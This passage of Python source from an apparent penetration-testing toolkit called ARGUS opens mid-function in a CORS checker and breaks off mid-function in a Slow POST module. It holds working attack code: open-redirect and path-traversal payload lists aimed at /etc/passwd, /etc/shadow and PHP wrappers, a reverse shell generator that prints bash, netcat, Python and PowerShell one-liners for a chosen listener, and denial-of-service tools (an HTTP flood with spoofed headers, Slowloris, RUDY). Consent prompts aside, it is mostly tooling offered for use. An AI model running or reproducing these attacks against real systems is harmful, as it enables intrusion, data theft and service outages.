            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao:
                is_vuln = False
                if acao == "*":
                    print_warn(f"Wildcard ACAO — {description}")
                    if acac.lower() == "true":
                        is_vuln = True
                elif acao == origin and origin != target_origin:
                    is_vuln = True

                if is_vuln:
                    print_err(f"{R}VULNERABLE{RST} — {description}")
                    print(f"       Origin:  {W}{origin}{RST}")
                    print(f"       ACAO:    {W}{acao}{RST}")
                    print(f"       ACAC:    {W}{acac}{RST}")
                    vulns.append(description)
                elif acao == origin and origin == target_origin:
                    print_ok(f"Same-origin reflected (expected) — {description}")
                else:
                    print(f"  {C}  OK{RST}    ACAO: {acao}  — {description}")
            else:
                print(f"  {C}  OK{RST}    No ACAO header — {description}")
        except Exception as e:
            print_err(f"Error testing {description}: {e}")

    print(f"\n  {Y}{'═' * 50}{RST}")
    if vulns:
        print(f"  {R}Found {len(vulns)} CORS misconfiguration(s)!{RST}")
        print_warn("Attacker can read responses cross-origin")
    else:
        print_ok("No CORS misconfigurations detected")


# ─── 35. Open Redirect Scanner ───────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00.target.com",
    "https://evil.com?.target.com",
    "https://evil.com#.target.com",
    "https://evil.com@target.com",
    "https://target.com.evil.com",
    "//%0d%0aHost:evil.com",
    "https:evil.com",
    "////evil.com",
    "https://evil.com/%2f%2f",
    "///evil.com",
    "\\\\evil.com",
    "https://evil.com%23.target.com",
]


def open_redirect_scanner():
    print_header("Open Redirect Scanner")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with redirect param\n  (e.g. http://target.com/login?redirect=http://target.com)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter with a redirect value")
        return

    params = parsed.query.split("&")
    # Find likely redirect parameter
    redirect_params = ["redirect", "url", "next", "return", "returnurl",
                       "goto", "redir", "redirect_uri", "continue", "dest",
                       "destination", "forward", "target", "to", "out", "link"]

    param_idx = None
    for i, p in enumerate(params):
        pname = p.split("=")[0].lower()
        if pname in redirect_params:
            param_idx = i
            break

    if param_idx is None:
        print(f"\n  {Y}Parameters found:{RST}")
        for i, p in enumerate(params):
            print(f"    {C}{i+1}.{RST} {p}")
        idx = input(f"\n  {Y}Select redirect parameter (1-{len(params)}):{RST} ").strip()
        try:
            param_idx = int(idx) - 1
        except ValueError:
            print_err("Invalid number")
            return

    param_name = params[param_idx].split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    spinner("Testing redirect payloads...", 1.0)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    findings = []
    for payload in REDIRECT_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            resp = session.get(test_url, timeout=8, allow_redirects=False)
            location = resp.headers.get("Location", "")

            if resp.status_code in (301, 302, 303, 307, 308):
                if "evil.com" in location:
                    print_err(f"{R}REDIRECT TO EVIL{RST}  Status: {resp.status_code}")
                    print(f"       Payload:  {W}{payload}{RST}")
                    print(f"       Location: {W}{location}{RST}")
                    findings.append(payload)
                else:
                    print(f"  {C}  SAFE{RST}  Redirects to: {location[:60]}")
            else:
                print(f"  {C}  OK{RST}    No redirect (status {resp.status_code})")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} open redirect(s)!{RST}")
    else:
        print_ok("No open redirects found")


# ─── 36. LFI / Path Traversal Tester ─────────────────────────────────────────

LFI_PAYLOADS = [
    ("../../../etc/passwd", "/etc/passwd (3 levels)"),
    ("../../../../../../etc/passwd", "/etc/passwd (6 levels)"),
    ("....//....//....//etc/passwd", "Double-dot bypass"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "Full URL-encoded dots"),
    ("....\\....\\....\\etc\\passwd", "Backslash traversal"),
    ("..%252f..%252f..%252fetc/passwd", "Double URL-encode"),
    ("/etc/passwd", "Absolute path"),
    ("/etc/shadow", "Shadow file"),
    ("/etc/hosts", "Hosts file"),
    ("/proc/self/environ", "Process environment"),
    ("/proc/self/cmdline", "Process command line"),
    ("C:\\Windows\\system.ini", "Windows system.ini"),
    ("C:\\Windows\\win.ini", "Windows win.ini"),
    ("..\\..\\..\\..\\Windows\\system.ini", "Windows traversal"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
    ("php://input", "PHP input wrapper"),
    ("file:///etc/passwd", "File protocol"),
    ("/var/log/apache2/access.log", "Apache access log"),
    ("/var/log/nginx/access.log", "Nginx access log"),
]

LFI_SIGNATURES = [
    "root:x:0:0", "root:*:0:0",        # /etc/passwd
    "daemon:x:", "bin:x:",              # /etc/passwd
    "[fonts]", "[extensions]",           # system.ini / win.ini
    "localhost", "127.0.0.1",            # /etc/hosts
    "HTTP_", "DOCUMENT_ROOT",            # /proc/self/environ
]


def lfi_tester():
    print_header("LFI / Path Traversal Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with file param (e.g. http://target.com/page?file=about)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a file/page parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        param_idx = int(param_idx) - 1
        if not (0 <= param_idx < len(params)):
            print_err("Invalid")
            return
    except ValueError:
        print_err("Invalid number")
        return

    param_name = params[param_idx].split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    spinner("Testing LFI payloads...", 1.0)

    findings = []
    for payload, description in LFI_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            resp = session.get(test_url, timeout=8)
            body = resp.text

            detected = False
            for sig in LFI_SIGNATURES:
                if sig in body:
                    print_err(f"{R}LFI FOUND{RST} — {description}")
                    print(f"       Payload: {W}{payload}{RST}")
                    # Show a snippet
                    idx = body.index(sig)
                    snippet = body[max(0, idx-20):idx+80].replace("\n", "\\n")
                    print(f"       Preview: {W}{snippet[:100]}{RST}")
                    findings.append((payload, description))
                    detected = True
                    break

            if not detected:
                print(f"  {C}  CLEAN{RST}  {description}")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} LFI vulnerability(ies)!{RST}")
    else:
        print_ok("No LFI vulnerabilities found with basic payloads")


# ─── 37. Subdomain Takeover Check ────────────────────────────────────────────

TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": ["There isn't a GitHub Pages site here"],
    "Heroku": ["No such app", "no-such-app"],
    "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
    "Shopify": ["Sorry, this shop is currently unavailable"],
    "Tumblr": ["There's nothing here", "Whatever you were looking for doesn't currently exist"],
    "WordPress.com": ["Do you want to register"],
    "Zendesk": ["Help Center Closed"],
    "Fastly": ["Fastly error: unknown domain"],
    "Pantheon": ["404 error unknown site"],
    "Unbounce": ["The requested URL was not found on this server"],
    "Surge.sh": ["project not found"],
    "Bitbucket": ["Repository not found"],
    "Ghost": ["The thing you were looking for is no longer here"],
    "Fly.io": ["404 Not Found"],
    "Netlify": ["Not Found - Request ID"],
    "Cargo": ["If you're moving your domain away from Cargo"],
    "Strikingly": ["page not found"],
    "Agile CRM": ["Sorry, this page is no longer available"],
}


def subdomain_takeover():
    print_header("Subdomain Takeover Check")
    if not exploit_disclaimer():
        return

    domain = prompt("Domain (will check subdomains via crt.sh)")
    if not domain:
        return

    spinner("Fetching subdomains from crt.sh...", 1.5)
    try:
        resp = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        data = resp.json()
        subdomains = set()
        for entry in data:
            for sub in entry.get("name_value", "").split("\n"):
                sub = sub.strip().lower()
                if sub.endswith(domain) and "*" not in sub:
                    subdomains.add(sub)
    except Exception as e:
        print_err(f"Could not fetch subdomains: {e}")
        return

    if not subdomains:
        print_warn("No subdomains found")
        return

    print_row("Subdomains Found", str(len(subdomains)))
    spinner("Checking for CNAME dangling...", 0.5)

    vulnerable = []
    for sub in sorted(subdomains):
        # Check CNAME
        cname = None
        if dns:
            try:
                answers = dns.resolver.resolve(sub, "CNAME")
                for rdata in answers:
                    cname = str(rdata.target).rstrip(".")
            except Exception:
                continue

        if not cname:
            continue

        # Check if CNAME target resolves
        try:
            socket.gethostbyname(cname)
        except socket.gaierror:
            print_warn(f"{sub} -> {cname} (CNAME does not resolve!)")
            vulnerable.append((sub, cname, "NXDOMAIN"))
            continue

        # Check for takeover fingerprints
        try:
            resp = requests.get(f"http://{sub}", timeout=6, allow_redirects=True)
            body = resp.text
            for service, fingerprints in TAKEOVER_FINGERPRINTS.items():
                for fp in fingerprints:
                    if fp.lower() in body.lower():
                        print_err(f"{R}TAKEOVER POSSIBLE{RST}: {sub} -> {cname} ({service})")
                        vulnerable.append((sub, cname, service))
                        break
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if vulnerable:
        print(f"  {R}Found {len(vulnerable)} potential takeover(s)!{RST}")
        for sub, cname, reason in vulnerable:
            print(f"    {R}•{RST} {sub} -> {cname} ({reason})")
    else:
        print_ok("No subdomain takeover opportunities found")


# ─── 38. Reverse Shell Generator ─────────────────────────────────────────────

def revshell_generator():
    print_header("Reverse Shell Generator")
    if not exploit_disclaimer():
        return

    ip = prompt("Your listener IP (LHOST)")
    if not ip:
        return
    port = prompt("Your listener port (LPORT)")
    if not port:
        return

    shells = {
        "Bash -i": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Bash (alt)": f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
        "Python3": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "Python2": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "Perl": f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\'',
        "PHP": f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "Ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        "Netcat (traditional)": f"nc -e /bin/sh {ip} {port}",
        "Netcat (OpenBSD)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "Netcat (busybox)": f"busybox nc {ip} {port} -e sh",
        "Lua": f'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\')"',
        "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "Java (Runtime)": f'Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}});p.waitFor();',
        "xterm": f"xterm -display {ip}:1",
        "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    }

    print(f"\n  {Y}Listener command:{RST}")
    print(f"  {G}nc -lvnp {port}{RST}")
    print(f"\n  {Y}Or with socat:{RST}")
    print(f"  {G}socat file:`tty`,raw,echo=0 tcp-listen:{port}{RST}")

    for name, payload in shells.items():
        print(f"\n  {M}── {name} ──{RST}")
        print(f"  {W}{payload}{RST}")

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_warn("Remember to start your listener before executing the payload")
    print_warn("Use 'rlwrap nc -lvnp PORT' for a better shell experience")


# ─── 39. CMS Vulnerability Scanner ───────────────────────────────────────────

def cms_vuln_scanner():
    print_header("CMS Vulnerability Scanner")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL (e.g. https://target.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    spinner("Detecting CMS...", 1.0)

    # Detect CMS
    cms = None
    try:
        resp = session.get(url, timeout=10)
        body = resp.text.lower()
        headers = resp.headers

        if "wp-content" in body or "wp-includes" in body:
            cms = "WordPress"
        elif "joomla" in body or "/media/system/js/" in body:
            cms = "Joomla"
        elif "drupal" in body or "sites/all/" in body:
            cms = "Drupal"
        elif headers.get("X-Powered-By", "").lower().startswith("express"):
            cms = "Express.js"
        elif "shopify" in body:
            cms = "Shopify"
    except Exception as e:
        print_err(f"Could not reach target: {e}")
        return

    if not cms:
        print_warn("Could not detect a known CMS. Running generic checks...")
        cms = "Generic"

    print_row("Detected CMS", cms)

    # CMS-specific checks
    checks = {
        "WordPress": [
            ("/wp-login.php", "Login page"),
            ("/wp-admin/", "Admin panel"),
            ("/xmlrpc.php", "XML-RPC (brute-force vector)"),
            ("/wp-json/wp/v2/users", "User enumeration API"),
            ("/wp-json/", "REST API root"),
            ("/wp-content/debug.log", "Debug log (info leak)"),
            ("/wp-config.php.bak", "Config backup"),
            ("/wp-config.php~", "Config editor backup"),
            ("/wp-config.php.save", "Config save file"),
            ("/wp-content/uploads/", "Uploads directory listing"),
            ("/?author=1", "Author enumeration"),
            ("/wp-includes/", "Includes directory"),
            ("/readme.html", "WP readme (version info)"),
            ("/license.txt", "License file"),
            ("/wp-cron.php", "WP-Cron"),
            ("/wp-content/plugins/", "Plugins directory"),
            ("/wp-content/themes/", "Themes directory"),
        ],
        "Joomla": [
            ("/administrator/", "Admin panel"),
            ("/configuration.php~", "Config backup"),
            ("/configuration.php.bak", "Config backup"),
            ("/robots.txt", "Robots.txt"),
            ("/README.txt", "Readme (version)"),
            ("/LICENSE.txt", "License"),
            ("/htaccess.txt", "Htaccess info"),
            ("/web.config.txt", "Web config"),
            ("/administrator/manifests/files/joomla.xml", "Version XML"),
            ("/language/en-GB/en-GB.xml", "Language version"),
            ("/plugins/system/cache/cache.xml", "Cache plugin"),
            ("/api/", "API endpoint"),
        ],
        "Drupal": [
            ("/user/login", "Login page"),
            ("/admin/", "Admin panel"),
            ("/CHANGELOG.txt", "Changelog (version)"),
            ("/core/CHANGELOG.txt", "Core changelog"),
            ("/node/1", "Node access test"),
            ("/user/register", "Registration page"),
            ("/core/install.php", "Install script"),
            ("/update.php", "Update script"),
            ("/xmlrpc.php", "XML-RPC"),
            ("/sites/default/files/", "Default files"),
            ("/INSTALL.txt", "Install info"),
            ("/core/INSTALL.txt", "Core install info"),
        ],
    }

    paths = checks.get(cms, [
        ("/.git/HEAD", "Git repository"),
        ("/.env", "Environment file"),
        ("/.svn/entries", "SVN repository"),
        ("/composer.json", "Composer (PHP)"),
        ("/package.json", "NPM package"),
        ("/server-status", "Apache server status"),
        ("/server-info", "Apache server info"),
        ("/info.php", "PHP info"),
        ("/phpinfo.php", "PHP info"),
        ("/elmah.axd", ".NET error log"),
        ("/web.config", "IIS config"),
    ])

    spinner("Scanning known paths...", 0.5)
    findings = []

    def check_path(path_info):
        path, desc = path_info
        try:
            test_url = f"{url}{path}"
            resp = session.get(test_url, timeout=6, allow_redirects=False)
            return path, desc, resp.status_code, len(resp.content), resp.text[:500]
        except Exception:
            return path, desc, 0, 0, ""

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = [pool.submit(check_path, p) for p in paths]
        for future in concurrent.futures.as_completed(futures):
            path, desc, code, size, preview = future.result()
            if code == 200:
                risk = ""
                # Check for sensitive content
                if any(s in preview.lower() for s in ["password", "db_", "secret", "key", "token"]):
                    risk = f" {R}[SENSITIVE DATA!]{RST}"
                print_err(f"{G}200{RST}  {path:<40} {desc}{risk}")
                findings.append((path, desc, "accessible"))
            elif code == 403:
                print(f"  {Y}403{RST}  {path:<40} {desc} (exists but forbidden)")
                findings.append((path, desc, "forbidden"))
            elif code in (301, 302):
                print(f"  {C}{code}{RST}  {path:<40} {desc} (redirect)")

    # WordPress-specific deep checks
    if cms == "WordPress":
        print(f"\n  {M}── WordPress Deep Checks ──{RST}")
        # Try user enumeration
        try:
            resp = session.get(f"{url}/wp-json/wp/v2/users", timeout=8)
            if resp.status_code == 200:
                users = resp.json()
                if isinstance(users, list) and users:
                    print_err(f"User enumeration possible! Found {len(users)} user(s):")
                    for u in users[:10]:
                        print(f"    {R}•{RST} {u.get('slug', 'N/A')} (ID: {u.get('id', '?')})")
        except Exception:
            pass

        # Check xmlrpc
        try:
            resp = session.post(f"{url}/xmlrpc.php", timeout=8,
                                data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                                headers={"Content-Type": "text/xml"})
            if resp.status_code == 200 and "methodResponse" in resp.text:
                methods_count = resp.text.count("<string>")
                print_err(f"XML-RPC enabled with {methods_count} methods (brute-force / DDoS vector)")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Findings", str(len(findings)))


# ─── 40. Payload Encoder / Decoder ───────────────────────────────────────────

def payload_encoder():
    print_header("Payload Encoder / Decoder")

    print(f"""
  {Y}Encoding modes:{RST}
    {C}1.{RST} URL Encode
    {C}2.{RST} URL Decode
    {C}3.{RST} Base64 Encode
    {C}4.{RST} Base64 Decode
    {C}5.{RST} Hex Encode
    {C}6.{RST} Hex Decode
    {C}7.{RST} HTML Entity Encode
    {C}8.{RST} HTML Entity Decode
    {C}9.{RST} Unicode Escape
    {C}10.{RST} Double URL Encode
    {C}11.{RST} Hash (MD5/SHA1/SHA256)
    """)

    mode = input(f"  {Y}Select mode (1-11):{RST} ").strip()
    text = prompt("Input text")
    if not text:
        return

    import base64
    import urllib.parse
    import html

    result = ""
    label = ""

    if mode == "1":
        result = urllib.parse.quote(text, safe="")
        label = "URL Encoded"
    elif mode == "2":
        result = urllib.parse.unquote(text)
        label = "URL Decoded"
    elif mode == "3":
        result = base64.b64encode(text.encode()).decode()
        label = "Base64 Encoded"
    elif mode == "4":
        try:
            result = base64.b64decode(text).decode(errors="replace")
            label = "Base64 Decoded"
        except Exception:
            print_err("Invalid Base64 input")
            return
    elif mode == "5":
        result = text.encode().hex()
        label = "Hex Encoded"
    elif mode == "6":
        try:
            result = bytes.fromhex(text).decode(errors="replace")
            label = "Hex Decoded"
        except Exception:
            print_err("Invalid hex input")
            return
    elif mode == "7":
        result = html.escape(text)
        label = "HTML Encoded"
    elif mode == "8":
        result = html.unescape(text)
        label = "HTML Decoded"
    elif mode == "9":
        result = "".join(f"\\u{ord(c):04x}" for c in text)
        label = "Unicode Escaped"
    elif mode == "10":
        result = urllib.parse.quote(urllib.parse.quote(text, safe=""), safe="")
        label = "Double URL Encoded"
    elif mode == "11":
        data = text.encode()
        print(f"\n  {Y}Hashes:{RST}")
        print_row("MD5", hashlib.md5(data).hexdigest())
        print_row("SHA-1", hashlib.sha1(data).hexdigest())
        print_row("SHA-256", hashlib.sha256(data).hexdigest())
        print_row("SHA-512", hashlib.sha512(data).hexdigest())
        return
    else:
        print_err("Invalid mode")
        return

    print(f"\n  {Y}{label}:{RST}")
    print(f"  {G}{result}{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#                     STRESS TESTING / DoS MODULES
# ═══════════════════════════════════════════════════════════════════════════════

STRESS_DISCLAIMER = f"""
  {R}╔══════════════════════════════════════════════════════════╗
  ║{RST} {R}▓▓▓  DANGER ZONE — STRESS / DENIAL-OF-SERVICE TOOLS  ▓▓▓{RST} {R}║
  ╠══════════════════════════════════════════════════════════╣
  ║ {Y}These tools WILL disrupt or crash the target service.{R}    ║
  ║ {W}Use ONLY against infrastructure you OWN or have{R}         ║
  ║ {W}EXPLICIT WRITTEN AUTHORIZATION to test.{R}                  ║
  ║                                                          ║
  ║ {Y}Unauthorized use is a CRIMINAL OFFENSE under:{R}            ║
  ║ {W}  • CFAA (US)  • Computer Misuse Act (UK){R}               ║
  ║ {W}  • Art. 615-ter/quinquies C.P. (IT){R}                    ║
  ║ {W}  • Equivalent laws in most countries{R}                    ║
  ║                                                          ║
  ║ {R}YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS.{R}             ║
  ╚══════════════════════════════════════════════════════════╝{RST}
"""


def stress_disclaimer():
    print(STRESS_DISCLAIMER)
    c1 = input(f"  {R}Do you have WRITTEN authorization to stress-test this target? (yes/no):{RST} ").strip().lower()
    if c1 not in ("yes", "y", "si", "s"):
        return False
    c2 = input(f"  {R}Type 'I ACCEPT ALL RESPONSIBILITY' to continue:{RST} ").strip()
    if c2.upper() != "I ACCEPT ALL RESPONSIBILITY":
        print_err("Aborted. You must accept responsibility to use these tools.")
        return False
    return True


def _stress_stats(label, stop_event, counter, start_time):
    """Background thread that prints live stats every second."""
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if elapsed > 0:
            rps = counter[0] / elapsed
            sys.stdout.write(
                f"\r  {Y}[{label}]{RST} Sent: {G}{counter[0]}{RST}  "
                f"Rate: {C}{rps:.0f}/s{RST}  "
                f"Elapsed: {W}{elapsed:.1f}s{RST}   "
            )
            sys.stdout.flush()
        time.sleep(0.5)
    print()


# ─── 41. HTTP Flood (GET/POST) ───────────────────────────────────────────────

def http_flood():
    print_header("HTTP Flood (GET/POST)")
    if not stress_disclaimer():
        return

    url = prompt("Target URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    method = input(f"  {Y}Method (GET/POST) [GET]:{RST} ").strip().upper() or "GET"
    threads = input(f"  {Y}Threads (1-200) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        threads = min(200, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    print_row("Target", url)
    print_row("Method", method)
    print_row("Threads", str(threads))
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    stop_event = threading.Event()
    counter = [0]  # mutable for threads
    errors = [0]
    start_time = time.time()

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    ]

    def flood_worker():
        session = requests.Session()
        while not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Cache-Control": "no-cache",
                    "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                }
                if method == "POST":
                    data = "".join(random.choices(string.ascii_letters, k=random.randint(64, 512)))
                    session.post(url, headers=headers, data=data, timeout=5, verify=False)
                else:
                    # Add random param to bypass cache
                    sep = "&" if "?" in url else "?"
                    cache_bust = f"{sep}_={random.randint(100000,999999)}"
                    session.get(url + cache_bust, headers=headers, timeout=5, verify=False)
                counter[0] += 1
            except Exception:
                errors[0] += 1

    stats_thread = threading.Thread(target=_stress_stats, args=("HTTP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Requests", str(counter[0]))
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} req/s" if elapsed > 0 else "N/A")


# ─── 42. Slowloris ───────────────────────────────────────────────────────────

def slowloris():
    print_header("Slowloris (Slow HTTP Headers)")
    if not stress_disclaimer():
        return

    target = prompt("Target host (domain or IP)")
    if not target:
        return
    port_s = input(f"  {Y}Port [80]:{RST} ").strip() or "80"
    sockets_s = input(f"  {Y}Sockets (1-1000) [200]:{RST} ").strip() or "200"
    duration = input(f"  {Y}Duration in seconds (1-300) [60]:{RST} ").strip() or "60"

    try:
        port = int(port_s)
        num_sockets = min(1000, max(1, int(sockets_s)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    print_row("Target", f"{target}:{port}")
    print_row("Sockets", str(num_sockets))
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if port == 443:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            ua = f"User-Agent: Mozilla/5.0 (ARGUS Slowloris {random.randint(0,9999)})\r\n"
            s.send(ua.encode())
            return s
        except Exception:
            return None

    socket_list = []
    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    # Initial socket creation
    spinner("Opening initial sockets...", 0.5)
    for _ in range(num_sockets):
        s = create_socket()
        if s:
            socket_list.append(s)
            counter[0] += 1

    print_ok(f"Opened {len(socket_list)} initial connections")

    stats_thread = threading.Thread(
        target=_stress_stats, args=("SLOWLORIS", stop_event, counter, start_time)
    )
    stats_thread.daemon = True
    stats_thread.start()

    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            # Send keep-alive headers
            for s in list(socket_list):
                try:
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                    counter[0] += 1
                except Exception:
                    socket_list.remove(s)

            # Refill dropped sockets
            diff = num_sockets - len(socket_list)
            for _ in range(diff):
                s = create_socket()
                if s:
                    socket_list.append(s)
                    counter[0] += 1

            time.sleep(10)  # slowloris sends infrequently
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        for s in socket_list:
            try:
                s.close()
            except Exception:
                pass
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Sends", str(counter[0]))
    print_row("Peak Sockets", str(num_sockets))
    print_row("Duration", f"{elapsed:.1f}s")


# ─── 43. Slow POST (R.U.D.Y.) ────────────────────────────────────────────────

def slow_post():
    print_header("Slow POST Attack (R.U.D.Y.)")
    if not stress_disclaimer():
        return

    url = prompt("Target URL with POST endpoint (e.g. http://target.com/login)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    conns = input(f"  {Y}Connections (1-200) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [60]:{RST} ").strip() or "60"

    try:
        conns = min(200, max(1, int(conns)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "https"
    port = 443 if use_ssl else 80
    if ":" in host:
        host, port = host.rsplit(":", 1)
        port = int(port)

    print_row("Target", url)
    print_row("Connections", str(conns))
    print_row("Duration", f"{duration}s")
    print_warn("Sends POST body byte-by-byte to exhaust server connections")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    fake_len = random.randint(10000, 100000)

    def rudy_worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if use_ssl:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.connect((host, port))

                header = (
                    f"POST {path} HTTP/1.1\r\n"
